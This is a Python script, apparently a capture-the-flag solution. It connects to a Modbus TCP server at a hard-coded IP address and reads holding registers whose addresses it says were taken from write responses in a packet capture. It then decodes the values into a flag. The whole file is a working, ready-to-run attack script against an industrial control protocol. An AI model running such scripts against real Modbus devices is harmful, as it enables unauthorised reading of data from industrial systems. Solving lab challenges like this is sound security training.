#!/usr/bin/env python3
# intrusion_read.py
# Reads sensitive holding registers from a Modbus server identified via PCAP analysis.
#
# The register addresses were extracted from FC16 (Write Multiple Registers) response
# packets in the PCAP — these echo back the address of every register written to,
# acting as a map of where sensitive data is stored.
#
# Usage:
#   python3 -m pip install umodbus --break-system-packages
#   python3 intrusion_read.py
#
# Tested on: python3, umodbus

import socket
from umodbus import conf
from umodbus.client import tcp

conf.SIGNED_VALUES = False

# Target
HOST = '154.57.164.83'
PORT = 31922
UNIT_ID = 52  # 0x34 — seen in all PCAP packets

# Register addresses extracted from FC16 response packets in network_logs.pcapng
# Each FC16 response echoes [register_address][word_count] — these are the written registers
FC16_REGS = [
    6, 10, 12, 21, 22, 26, 47, 53, 63, 77, 83, 86, 89, 95, 96, 104,
    123, 128, 131, 134, 139, 143, 144, 145, 153, 163, 168, 173, 179,
    193, 206, 210, 214, 215, 219, 221, 224, 225, 226, 231, 239, 253
]

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((HOST, PORT))
    print(f"[+] Connected to {HOST}:{PORT} (Unit ID: {UNIT_ID})")

    print(f"\n[*] Reading {len(FC16_REGS)} registers identified from PCAP FC16 responses...")
    reg_values = {}

    for reg in FC16_REGS:
        try:
            msg = tcp.read_holding_registers(
                slave_id=UNIT_ID,
                starting_address=reg,
                quantity=1
            )
            data = tcp.send_message(msg, sock)
            val = data[0]
            reg_values[reg] = val
            char = chr(val) if 32 <= val <= 126 else f'[{val}]'
            print(f"  Reg {reg:3d}: {val:5d} (0x{val:04x}) = '{char}'")
        except Exception as e:
            print(f"  Reg {reg:3d}: ERROR — {e}")

    print()
    print("[*] Assembling flag from register values (in PCAP order):")
    flag = ''.join(chr(v) if 32 <= v <= 126 else f'[{v}]' for v in reg_values.values())
    print(f"\n  FLAG: {flag}\n")

    sock.close()

if __name__ == '__main__':
    main()
